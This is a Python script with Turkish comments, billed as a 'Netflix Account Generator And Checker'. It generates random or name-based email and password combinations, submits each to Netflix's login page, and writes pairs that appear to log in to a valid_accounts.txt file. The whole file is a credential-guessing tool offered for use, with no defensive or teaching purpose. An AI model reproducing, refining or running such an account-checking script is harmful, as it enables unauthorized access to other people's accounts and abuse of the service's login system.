print("Owned By Emin INC.")
print("Netflix Account Generator And Checker 1.0")
print("Bulunan hesapların kaydedilmesi için valid_accounts.txt adında bir metin belgesi oluşturun yada değiştirin.")
print("'# Geçerli hesapları kaydetme ' arayın ve 'valid_accounts.txt' adını değiştirebilirsiniz.")
import random
import string
import time
import requests

# Gerçekçi e-posta üretimi
def generate_realistic_email():
    domains = ["@outlook.com", "@hotmail.com", "@gmail.com"]
    domain = random.choice(domains)
    first_names = ["john", "emma", "james", "olivia", "michael", "sophia", "liam", "lucas", "isabella", "mason", 
                   "charlotte", "harry", "ella", "jack", "grace", "william", "amanda", "matthew", "ava", "ethan", 
                   "chloe", "michael", "maddie", "benjamin", "ella", "leah", "lucy", "ryan", "zoe", "lily", "harper"]
    last_names = ["smith", "johnson", "williams", "brown", "jones", "davis", "garcia", "martinez", "rodriguez", 
                  "hernandez", "moore", "taylor", "anderson", "thomas", "jackson", "white", "lopez", "lee", "gonzalez", 
                  "wilson", "sanchez", "robinson", "clark", "miller", "evans", "collins", "stewart", "baker", "hall", "young"]
    first_name = random.choice(first_names)
    last_name = random.choice(last_names)
    username = first_name + last_name + ''.join(random.choices(string.digits, k=random.randint(1, 4)))
    return f"{username}{random.randint(10, 99)}{domain}"

# Rastgele e-posta üretimi
def generate_random_email():
    domains = ["@outlook.com", "@hotmail.com", "@gmail.com"]
    domain = random.choice(domains)
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=random.randint(6, 12)))
    return f"{username}{random.randint(10, 99)}{domain}"

# Normal parola üretimi
def generate_random_password():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(8, 16)))

# Gerçekçi parola üretimi (adı ve soyadı içerir)
def generate_realistic_password(first_name, last_name):
    password = first_name.capitalize() + last_name.capitalize() + ''.join(random.choices(string.digits, k=random.randint(2, 4)))
    return password

# Hesapları oluşturma
def generate_accounts(num_accounts, mode, password_mode):
    accounts = []
    first_names = ["john", "emma", "james", "olivia", "michael", "sophia", "liam", "lucas", "isabella", "mason", 
                   "charlotte", "harry", "ella", "jack", "grace", "william", "amanda", "matthew", "ava", "ethan", 
                   "chloe", "michael", "maddie", "benjamin", "ella", "leah", "lucy", "ryan", "zoe", "lily", "harper"]
    last_names = ["smith", "johnson", "williams", "brown", "jones", "davis", "garcia", "martinez", "rodriguez", 
                  "hernandez", "moore", "taylor", "anderson", "thomas", "jackson", "white", "lopez", "lee", "gonzalez", 
                  "wilson", "sanchez", "robinson", "clark", "miller", "evans", "collins", "stewart", "baker", "hall", "young"]
    
    for _ in range(num_accounts):
        if mode == "1":
            email = generate_realistic_email()
            first_name = random.choice(first_names)
            last_name = random.choice(last_names)
        else:
            email = generate_random_email()
            first_name = ''
            last_name = ''
        
        if password_mode == "2" and first_name and last_name:
            password = generate_realistic_password(first_name, last_name)
        else:
            password = generate_random_password()

        accounts.append((email, password))
    return accounts

# Hesap doğrulaması
def check_account_validity(email, password):
    url = "https://www.netflix.com/login"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }
    data = {
        "email": email,
        "password": password
    }
    response = requests.post(url, headers=headers, data=data)
    if "Sign Out" in response.text:
        return True
    else:
        return False

# Geçerli hesapları kaydetme
def save_valid_accounts(accounts):
    with open("valid_accounts.txt", "a") as file:
        for email, password in accounts:
            file.write(f"E-posta: {email}, Şifre: {password}\n")

# Ana fonksiyon
def main():
    num_accounts = int(input("Üretecek hesap miktarını girin: "))

    mode = input("Mod seçin (1: Gerçekçi isimler, 2: Normal): ")
    if mode not in ["1", "2"]:
        print("Geçersiz mod seçimi. Varsayılan olarak normal mod kullanılacak.")
        mode = "2"

    speed_mode = input("Hız modunu seçin (1: Normal, 2: Hızlı): ")
    if speed_mode == "1":
        delay = 1
    elif speed_mode == "2":
        delay = 0.5
    else:
        print("Geçersiz hız modu seçimi. Varsayılan olarak normal hız kullanılacak.")
        delay = 1

    password_mode = input("Parola gerçekliği modunu seçin (1: Normal Parola, 2: Gerçekçi Parola): ")
    if password_mode not in ["1", "2"]:
        print("Geçersiz parola modu seçimi. Varsayılan olarak normal parola kullanılacak.")
        password_mode = "1"

    accounts = generate_accounts(num_accounts, mode, password_mode)
    
    print("Hesapların geçerliliği kontrol ediliyor...")
    valid_accounts = []
    for email, password in accounts:
        time.sleep(delay)  # Hız moduna göre gecikme ekle
        if check_account_validity(email, password):
            print(f"E-posta: {email}, Şifre: {password} - Geçerli")
            valid_accounts.append((email, password))
        else:
            print(f"E-posta: {email}, Şifre: {password} - Geçersiz")
    
    if valid_accounts:
        save_valid_accounts(valid_accounts)
        print("Geçerli hesaplar 'valid_accounts.txt' dosyasına kaydedildi.")

# Ana fonksiyonu çalıştırma
if __name__ == "__main__":
    main()
